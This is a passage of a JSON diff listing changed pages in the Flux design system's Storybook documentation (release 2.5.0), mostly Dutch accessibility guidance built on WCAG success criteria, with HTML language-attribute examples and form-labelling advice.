+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-5-input-modaliteiten--documentatie",
+            "added": "(152 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-overzicht--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/2. Bedienbaar/Overzicht",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-overzicht--documentatie",
+            "added": "(140 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-1-leesbaar--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/3. Begrijpelijk/3.1 Leesbaar",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-1-leesbaar--documentatie",
+            "added": "    FluxWcagExample,\n    FluxWcagExamplesTitle,\n    FluxWcagSuccesscriterium\n} from \"../../../../.storybook/flux-wcag/flux-wcag-succescriterium\";\n\n\n<FluxWcagRichtlijn\n    level=\"3.1\"\n    title=\"Leesbaar\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#readable\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#readable\"\n    text={\n        <>\n            Zorg ervoor dat iedereen de inhoud kan lezen en begrijpen. Of het nu gaat om inhoud die gebruikers zien,\n            horen of voelen.\n        </>\n    }\n>\n\n<FluxWcagBronsPlus></FluxWcagBronsPlus>\n\n<FluxWcagSuccesscriterium\n    title=\"Taal van de pagina\"\n    level=\"3.1.1\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#language-of-page\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#language-of-page\"\n    text={\n        <>\n            Geef in de code van elke pagina aan wat de <strong>hoofdtaal</strong> van de tekst is. Zo spreekt een\n            schermlezer alles uit met het juiste accent en de juiste uitspraak.\n        </>\n    }\n>\n\n<FluxWcagExamplesTitle></FluxWcagExamplesTitle>\n\n<FluxWcagExample\n    exampleNumber=\"1\"\n    title=\"Specifieer Frans als hoofdtaal.\"\n    link=\"https://www.w3.org/WAI/WCAG22/Techniques/html/H57\"\n>\n    ```html\n    <!doctype html>\n    <html lang=\"fr\">\n    <head>\n        <meta charset=\"utf-8\">\n        <title>document écrit en français</title>\n    </head>\n    <body>\n    ... document écrit en français ...\n    </body>\n    </html>\n    ```\n\n<div style={{marginTop: '4em'}} />\n\n<FluxWcagSilverPlus></FluxWcagSilverPlus>\n\n<FluxWcagSuccesscriterium\n    title=\"Taal van onderdelen\"\n    level=\"3.1.2\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#language-of-parts\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#language-of-parts\"\n    text={\n        <>\n            Geef aan wanneer de taal op een pagina <strong>verandert</strong> of wanneer een <strong>deel in een\n            andere</strong> taal is. Zo schakelen schermlezers daar over naar het juiste accent en de juiste uitspraak\n            voor die taal.\n        </>\n    }\n>\n\n<FluxWcagExamplesTitle></FluxWcagExamplesTitle>\n\n<FluxWcagExample\n    exampleNumber=\"1\"\n    title=\"Specifieer Duits als de taal van een quote.\"\n    link=\"https://www.w3.org/WAI/WCAG22/Techniques/html/H58\"\n>\n    ```html\n    <blockquote lang=\"de\">\n        <p>\n            Da dachte der Herr daran, ihn aus dem Futter zu schaffen,\n            aber der Esel merkte, daß kein guter Wind wehte, lief fort\n            und machte sich auf den Weg nach Bremen: dort, meinte er,\n            könnte er ja Stadtmusikant werden.\n        </p>\n    </blockquote>\n    ```\n\n<div style={{marginTop: '4em'}} />"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-2-voorspelbaar--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/3. Begrijpelijk/3.2 Voorspelbaar",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-2-voorspelbaar--documentatie",
+            "added": "(106 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-3-assistentie-bij-invoer--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/3. Begrijpelijk/3.3 Assistentie bij invoer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-3-assistentie-bij-invoer--documentatie",
+            "added": "(172 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-overzicht--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/3. Begrijpelijk/Overzicht",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-overzicht--documentatie",
+            "added": "<FluxWcagPrincipe\n    level=\"3.\"\n    title=\"Begrijpelijk\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#understandable\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#principle3\"\n    text={\n        <>\n            Je vindt makkelijk je weg en je doet vlot wat de bedoeling is.\n        </>\n    }\n>\n\n<table width=\"100%\" style={{marginBottom: '2em'}}>\n    <tr>\n        <td colspan=\"2\">\n            <div style={{color: 'black', fontWeight: 'bold'}}>3.1 Leesbaar <a href=\"./?path=/docs/richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-1-leesbaar--documentatie\">↗</a></div>\n        </td>\n    </tr>\n    <tr>\n        <td width={500}><div style={{color: 'black', fontWeight: 'bold'}}>basis</div></td>\n        <td width={500}><div style={{color: 'black', fontWeight: 'bold'}}>+</div></td>\n    </tr>\n    <tr>\n        <td></td>\n        <td>\n            <div style={{color: 'brown'}}>Taal van de pagina</div>\n            <hr style={{margin: '0.5em 0'}}/>\n            <div style={{color: 'black'}}>Taal van onderdelen</div>\n        </td>\n    </tr>\n</table>\n\n<table width=\"100%\" style={{marginBottom: '2em'}}>\n    <tr>\n        <td colspan=\"2\">\n            <div style={{color: 'black', fontWeight: 'bold'}}>3.2 Voorspelbaar <a href=\"./?path=/docs/richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-2-voorspelbaar--documentatie\">↗</a></div>\n        </td>\n    </tr>\n    <tr>\n        <td width={500}><div style={{color: 'black', fontWeight: 'bold'}}>basis</div></td>\n        <td width={500}><div style={{color: 'black', fontWeight: 'bold'}}>+</div></td>\n    </tr>\n    <tr>\n        <td>\n            <div style={{color: 'brown'}}>Bij focus</div>\n            <div style={{color: 'brown'}}>Bij input</div>\n            <div>&nbsp;</div>\n            <hr style={{margin: '0.5em 0'}}/>\n            <div style={{color: 'black'}}>Consistente navigatie</div>\n            <div style={{color: 'black'}}>Consistente identificatie</div>\n        </td>\n        <td>\n            <div>&nbsp;</div>\n            <div>&nbsp;</div>\n            <div style={{color: 'brown'}}>Consistente hulp</div>\n            <hr style={{margin: '0.5em 0'}}/>\n            <div>&nbsp;</div>\n            <div>&nbsp;</div>\n        </td>\n    </tr>\n</table>\n\n<table width=\"100%\" style={{marginBottom: '2em'}}>\n    <tr>\n        <td colspan=\"2\">\n            <div style={{color: 'black', fontWeight: 'bold'}}>3.3 Assistentie bij invoer <a href=\"./?path=/docs/richtlijnen-toegankelijkheid-aanpak-3-begrijpelijk-3-3-assistentie-bij-invoer--documentatie\">↗</a></div>\n        </td>\n    </tr>\n    <tr>\n        <td width={500}><div style={{color: 'black', fontWeight: 'bold'}}>basis</div></td>\n        <td width={500}><div style={{color: 'black', fontWeight: 'bold'}}>+</div></td>\n    </tr>\n    <tr>\n        <td>\n            <div style={{color: 'brown'}}>Foutidentificatie</div>\n            <div style={{color: 'brown'}}>Labels of instructies</div>\n            <div>&nbsp;</div>\n            <hr style={{margin: '0.5em 0'}}/>\n            <div style={{color: 'black'}}>Foutsuggestie</div>\n            <div>&nbsp;</div>\n            <div>&nbsp;</div>\n        </td>\n        <td>\n            <div>&nbsp;</div>\n            <div>&nbsp;</div>\n            <div style={{color: 'brown'}}>Overbodige invoer</div>\n            <hr style={{margin: '0.5em 0'}}/>\n            <div>&nbsp;</div>\n            <div style={{color: 'black'}}>Foutpreventie (wettelijk, financieel, gegevens)</div>\n            <div style={{color: 'black'}}>Toegankelijke authenticatie (minimum)</div>\n        </td>\n    </tr>\n</table>"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-4-robuust-4-1-compatibel--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/4. Robuust/4.1 Compatibel",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-4-robuust-4-1-compatibel--documentatie",
+            "added": "(120 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-4-robuust-overzicht--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/4. Robuust/Overzicht",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-4-robuust-overzicht--documentatie",
+            "added": "<FluxWcagPrincipe\n    level=\"4.\"\n    title=\"Robuust\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#robust\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#principle4\"\n    text={\n        <>\n            De inhoud moet altijd juist weergegeven worden en alle gebruikers moeten kunnen doen wat de bedoeling is.\n            Daarvoor moet de ontwikkelaar de juiste code gebruiken.\n        </>\n    }\n>\n\n<table width=\"100%\" style={{marginBottom: '2em'}}>\n    <tr>\n        <td colspan=\"2\">\n            <div style={{color: 'black', fontWeight: 'bold'}}>4.1 Compatibel <a href=\"./?path=/docs/richtlijnen-toegankelijkheid-aanpak-4-robuust-4-1-compatibel--documentatie\">↗</a></div>\n        </td>\n    </tr>\n    <tr>\n        <td width={500}><div style={{color: 'black', fontWeight: 'bold'}}>basis</div></td>\n        <td width={500}><div style={{color: 'black', fontWeight: 'bold'}}>+</div></td>\n    </tr>\n    <tr>\n        <td>\n            <div style={{color: 'brown'}}>Naam, rol, waarde</div>\n            <hr style={{margin: '0.5em 0'}}/>\n            <div>&nbsp;</div>\n        </td>\n        <td>\n            <div>&nbsp;</div>\n            <hr style={{margin: '0.5em 0'}}/>\n            <div style={{color: 'black'}}>Statusberichten</div>\n        </td>\n    </tr>\n</table>"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-toegankelijkheid-en-wcag--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/Toegankelijkheid en WCAG",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-toegankelijkheid-en-wcag--documentatie",
+            "added": "# Toegankelijkheid en WCAG\n## Inleiding\n## 4 Principes\n## 3 Niveaus\n### Documentatie\n## Evolutionaire Verbetering\n### Aanpak\n### Doel\n### Voorbeeld\n### Opmerkingen\n## Referenties\n(105 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-praktijk-gekende-beperkingen-wip--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Praktijk/Gekende Beperkingen [WIP]",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-praktijk-gekende-beperkingen-wip--documentatie",
+            "added": "# Gekende Beperkingen [WIP]\n\n## Focus op niet-tekstuele inputs\n\nOp Safari is het niet mogelijk om, met standaard instellingen, focus te leggen op een niet-tekstuele input zoals\nbuttons, checkboxes of radios. Dit is een [probleem gemeld bij Safari](https://bugs.webkit.org/show_bug.cgi?id=22261) -\nwaar het gemarkeerd is als WONTFIX.\n\nVolgens onze WCAG expert is dit een bewuste keuze van Apple en leidt dit al jaren tot verwarring.\n\nOm toch een focus te kunnen leggen op deze elementen kan je:\n- als gebruiker op Mac: `tab`+`option` drukken\n- of gebruik maken van de volgende instelling in Safari:\n    - ga naar `Safari > Settings > Advanced`\n    - zet de optie `Press Tab to highlight each item on a web page` aan; dan zal elke `tab` uitgevoerd worden als\n      `tab`+`option`"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-praktijk-richtlijnen-wip--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Praktijk/Richtlijnen [WIP]",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-praktijk-richtlijnen-wip--documentatie",
+            "added": "# Richtlijnen [WIP]\n\n## Form\n\n- Geef elke form control een label met:\n    - een [`<vl-form-label>` component](/docs/components-form-form-label--documentatie) gelinkt aan de form control\n      met `for` attribuut\n    - of met het `label` attribuut van de form control.\n- Geef duidelijke, specifieke instructies hoe een validatie fout kan opgelost worden in de foutboodschap.\n    - **NIET**: \"E-mail adres is niet juist.\"\n    - **WEL**: \"Vul een geldig e-mailadres in. Bijvoorbeeld: omgeving@vlaanderen.be\"\n- Stel het `placeholder` attribuut correct in. Gebruik het `placeholder` attribuut enkel als het een voorbeeldwaarde\n  is. Gebruik het niet als label.\n- Stel het `autocomplete` attribuut correct in. Gebruik waarde `off` als er geen relevante autocomplete suggesties\n  zijn. Meer info op [MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete)."
+          },
+          {
+            "id": "styles-base-body--documentatie",
+            "title": "Styles/Base (intern)/body",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-base-body--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-base-font--documentatie",
+            "title": "Styles/Base (intern)/font",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-base-font--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-base-mixin--documentatie",
+            "title": "Styles/Base (intern)/mixin",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-base-mixin--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-base-var--documentatie",
+            "title": "Styles/Base (intern)/var",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-base-var--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-concept--documentatie",
+            "title": "Styles/Concept",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-concept--documentatie",
+            "added": "# Styles\n## Inhoudstafel\n## Concept\n## Base (intern)\n## Layout (afnemers)\n### Beschikbare classes\n### Voorbeeld\n### Afname\n## Aanbevolen volgorde van styling\n## Utility classes (Digitaal Vlaanderen)\n## Conventies\n(172 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "styles-layout-afnemers-accessibility--documentatie",
+            "title": "Styles/Layout (afnemers)/accessibility",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-accessibility--documentatie",
+            "added": "Ze wordt gebruikt wanneer informatie niet zichtbaar hoeft te zijn voor ziende gebruikers, maar wel nog betekenisvol"
+          },
+          {
+            "id": "styles-layout-afnemers-content-block--documentatie",
+            "title": "Styles/Layout (afnemers)/content-block",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-content-block--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-layout-afnemers-grid--documentatie",
+            "title": "Styles/Layout (afnemers)/grid",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-grid--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-layout-afnemers-group--documentatie",
+            "title": "Styles/Layout (afnemers)/group",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-group--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-layout-afnemers-margin--documentatie",
+            "title": "Styles/Layout (afnemers)/margin",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-margin--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-layout-afnemers-padding--documentatie",
+            "title": "Styles/Layout (afnemers)/padding",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-padding--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-layout-afnemers-section--documentatie",
+            "title": "Styles/Layout (afnemers)/section",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-section--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-layout-afnemers-separator--documentatie",
+            "title": "Styles/Layout (afnemers)/separator",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-separator--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-layout-afnemers-spacer--documentatie",
+            "title": "Styles/Layout (afnemers)/spacer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-spacer--documentatie",
+            "added": null
+          },
+          {
+            "id": "styles-layout-afnemers-stacked--documentatie",
+            "title": "Styles/Layout (afnemers)/stacked",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/styles-layout-afnemers-stacked--documentatie",
+            "added": null
+          }
+        ]
+      }
+    }
+  ]
+}
